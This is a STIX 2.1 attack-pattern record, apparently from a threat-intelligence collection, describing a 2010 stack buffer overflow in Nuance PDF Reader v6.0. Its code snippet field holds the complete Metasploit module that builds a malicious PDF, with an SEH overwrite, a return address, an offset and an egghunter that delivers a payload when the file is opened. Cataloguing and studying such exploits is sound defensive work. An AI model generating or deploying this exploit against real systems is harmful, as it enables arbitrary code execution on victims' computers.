{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--46a5059e-0c77-44ab-a0d1-3f85d6138ad2",
    "created": "2024-08-14T16:37:04.151442Z",
    "modified": "2024-08-14T16:37:04.151446Z",
    "name": "Nuance PDF Reader v6.0 Launch Stack Buffer Overflow",
    "description": " This module exploits a stack buffer overflow in Nuance PDF Reader v6.0. The vulnerability is triggered when opening a malformed PDF file that contains an overly long string in a /Launch field. This results in overwriting a structured exception handler record. This exploit does not use javascript.  'License'\t=> MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/fileformat/nuance_pdf_launch_overflow.rb",
            "external_id": "nuance_pdf_launch_overflow.rb"
        },
        {
            "source_name": "reference",
            "url": "http://www.corelan.be:8800/index.php/forum/security-advisories/corelan-10-062-stack-buffer-overflow-in-nuance-pdf-reader-v6-0/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  include Msf::Exploit::FILEFORMAT\n  include Msf::Exploit::Egghunter\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'\t\t=> 'Nuance PDF Reader v6.0 Launch Stack Buffer Overflow',\n      'Description' \t=> %q{\n          This module exploits a stack buffer overflow in Nuance PDF Reader v6.0. The vulnerability is\n          triggered when opening a malformed PDF file that contains an overly long string in a /Launch field. This results in overwriting a structured exception handler record.\n          This exploit does not use javascript.\n      },\n      'License'\t=> MSF_LICENSE,\n      'Author'\t=>\n        [\n          'corelanc0d3r <peter.ve[at]corelan.be>',\n          'rick2600',\n        ],\n      'References'     =>\n        [\n          [ 'OSVDB', '68514'],\n          [ 'URL', 'http://www.corelan.be:8800/index.php/forum/security-advisories/corelan-10-062-stack-buffer-overflow-in-nuance-pdf-reader-v6-0/' ]\n        ],\n      'Payload'\t=>\n        {\n          'BadChars'\t=> \"\\x00\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0a\\x0d\\x22\\x28\\x29\\x2F\\x5c\\x3c\\x3e\\x5e\\x7e\",\n\n        },\n      'Platform'\t=> 'win',\n      'Targets'\t=>\n        [\n          [ 'Nuance PDF Reader v6.x (XP SP3)', { 'Ret' =>  0x10191579, 'Offset' => 1290 } ] #ppr - pluscore.dll\n        ],\n      'DisclosureDate' => '2010-10-08',\n      'DefaultTarget'\t=> 0))\n\n    register_options(\n      [\n        OptString.new('FILENAME', [ false, 'The output filename.', 'corelannuance.pdf'])\n      ])\n  end\n\n  def exploit\n\n    file_name = datastore['FILENAME']\n\n    badchars=\"\"\n    eggoptions =\n    {\n    :checksum => true,\n    :eggtag => \"w00t\"\n    }\n    hunter,egg = generate_egghunter(payload.encoded,badchars,eggoptions)\n\n    pdfpart1 = \"%PDF-1.4\\n\"\n    pdfpart1 << \"1 0 obj\\n\"\n    pdfpart1 << \"<</Type/Page/Parent 4 0 R /Resources 6 0 R /MediaBox[ 0 0 000 000]\"\n    pdfpart1 << \"/Group<</S/Transparency/CS/DeviceRGB/I true>>/Contents 2 0 R \"\n    pdfpart1 << \"/Annots[ 24 0 R  25 0 R  9 0 R ]>>\\n\"\n    pdfpart1 << \"endobj\\n\"\n    pdfpart1 << \"4 0 obj\\n\"\n    pdfpart1 << \"<</Type/Pages/Resources 6 0 R /MediaBox[ 0 0 000 000]/Kids[ 1 0 R ]/Count 1>>\\n\"\n    pdfpart1 << \"endobj\\n\"\n    pdfpart1 << \"7 0 obj\\n\"\n    pdfpart1 << \"<</Type/Catalog/Pages 4 0 R /OpenAction[ 1 0 R /XYZ null null 0]/Lang(en-US)/Names 28 0 R >>\\n\"\n    pdfpart1 << \"endobj\\n\"\n    pdfpart1 << \"9 0 obj\\n\"\n    pdfpart1 << \"<</Type/Annot/Subtype/Screen/P 1 0 R /M(E:000000000000000-00'00')/F 4/Rect[ \"\n    pdfpart1 << \"000.000 000.000 000.000 000.000]/BS<</S/S/W 1>>/BE<</S/S>>/MK<</BC[ 0 0 1]\"\n    pdfpart1 << \"/R 0/IF<</SW/A/S/A/FB false/A[ 0.5 0.5]>>>>/AP<</N 10 0 R >>/T()/A 12 0 R /AA 17 0 R >>\\n\"\n    pdfpart1 << \"endobj\\n\"\n    pdfpart1 << \"16 0 obj\\n\"\n    pdfpart1 << \"<</Type/Action/S/Launch/F<</F(/C/\"\n\n    pdfpart2 = \")>>/NewWindow true>>\\n\"\n    pdfpart2 << \"endobj\\n\"\n    pdfpart2 << \"17 0 obj\\n\"\n    pdfpart2 << \"<</PV 16 0 R >>\\n\"\n    pdfpart2 << \"endobj\\n\"\n    pdfpart2 << \"trailer\\n\"\n    pdfpart2 << \"<</Root 7 0 R /Info 8 0 R /ID[<00000000000000000000000000000000><00000000000000000000000000000000>]\"\n    pdfpart2 << \"/DocChecksum/00000000000000000000000000000000/Size 31>>\\n\"\n    pdfpart2 << \"startxref\\n\"\n    pdfpart2 << \"0000\\n\"\n    pdfpart2 << \"%%EOF\\n\"\n\n    buffer = \"\\x01\" * target['Offset']\n    nseh = \"\\xeb\\x06\\x41\\x41\"\n    seh = [target.ret].pack('V')\n    buffer2 = \"\\x01\" * (6908 - hunter.length - egg.length)\n\n    tweakhunter = \"\\x5a\"\n\n    makepdf = pdfpart1 + buffer + nseh + seh + tweakhunter + hunter + egg + buffer2 + pdfpart2\n\n    print_status(\"Creating '#{datastore['FILENAME']}' file...\")\n    file_create(makepdf)\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2010-10-08",
    "x_mitre_platforms": [
        "win'"
    ]
}